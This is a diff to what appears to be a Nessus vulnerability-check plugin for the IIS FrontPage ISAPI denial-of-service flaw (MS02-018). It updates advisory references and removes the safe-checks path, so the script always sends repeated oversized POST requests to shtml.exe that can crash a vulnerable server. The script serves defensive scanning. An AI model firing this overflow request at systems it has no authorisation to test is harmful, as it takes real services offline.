@@ -12,9 +12,10 @@
 if(description)
 {
  script_id(10937);
- script_cve_id("CAN-1999-1376", "CVE-2000-0226", "CVE-2002-0072");
- script_bugtraq_id(4479);
- script_version ("$Revision: 1.13 $");
+ script_bugtraq_id(1066, 4479);
+ script_cve_id("CVE-2002-0072");
+ if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2002-A-0002");
+ script_version ("$Revision: 1.26 $");
  
  name["english"] = "IIS FrontPage ISAPI Denial of Service";
 
@@ -27,8 +28,8 @@ in the Front Page ISAPI filter.
 An attacker may use this flaw to prevent the remote service
 from working properly.
 
-Solution: See http://www.microsoft.com/technet/security/bulletin/ms02-018.asp
-Risk factor : Medium";
+Solution: See http://www.microsoft.com/technet/security/bulletin/ms02-018.mspx
+Risk factor : High";
 
  script_description(english:desc["english"]);
 
@@ -37,10 +38,10 @@ Risk factor : Medium";
  script_summary(english:summary["english"]);
 
  # Category
- script_category(ACT_MIXED_ATTACK);
+ script_category(ACT_DENIAL);
 
  # Dependencie(s)
- script_dependencie("find_service.nes", "http_version.nasl", "no404.nasl");
+ script_dependencie("http_version.nasl", "iis_asp_overflow.nasl");
 
  # Family
  family["english"] = "Denial of Service";
@@ -53,49 +54,21 @@ Risk factor : Medium";
                   francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
 
  script_require_ports("Services/www", 80);
- script_require_keys("www/iis");
  exit(0);
 }
 
-port = is_cgi_installed("/_vti_bin/shtml.exe");
-if(!port)exit(0);
+include("http_func.inc");
+include("http_keepalive.inc");
+port = get_http_port(default:80);
 
-if(safe_checks())
-{
- desc = "
-The IIS server appears to have the .SHTML ISAPI filter mapped.
 
-At least one remote vulnerability has been discovered for the
-.SHTML filter. This is detailed in Microsoft Advisory MS02-018
-and results in a denial of service access to the web server. 
+res = is_cgi_installed_ka(item:"/_vti_bin/shtml.exe", port:port);
+if(!res)exit(0);
 
-It is recommended that even if you have patched this vulnerability that
-you unmap the .SHTML extension, and any other unused ISAPI extensions
-if they are not required for the operation of your site.
+banner = get_http_banner(port:port);
+if (! banner ) exit(0);
+if ( egrep(pattern:"^Server:.*IIS/[45]\.", string:banner) ) exit(0);
 
-An attacker may use this flaw to prevent the remote service
-from working properly.
-
-*** Nessus reports this vulnerability using only
-*** information that was gathered. Use caution
-*** when testing without safe checks enabled
-
-Solution: See 
-http://www.microsoft.com/technet/security/bulletin/ms02-018.asp
-and/or unmap the shtml/shtm isapi filters.
-
-To unmap the .shtml extension:
- 1.Open Internet Services Manager. 
- 2.Right-click the Web server choose Properties from the context menu. 
- 3.Master Properties 
- 4.Select WWW Service -> Edit -> HomeDirectory -> Configuration 
-and remove the reference to .shtml/shtm and sht from the list.
-
-Risk factor : Medium";
-
-    security_hole(port:port, data:desc);
-  exit(0);
-}
 
 if(get_port_state(port))
 {
@@ -108,6 +81,11 @@ if(get_port_state(port))
  for(i=0;i<5;i=i+1)
  {
  soc = open_sock_tcp(port);
+ if ( ! soc )
+ {
+	if ( i != 0 ) security_hole(port);
+	exit(0);
+ }
  req = http_post(item:string("/_vti_bin/shtml.exe?", crap(35000), ".html"), port:port);
  send(socket:soc, data:req);
  close(soc);
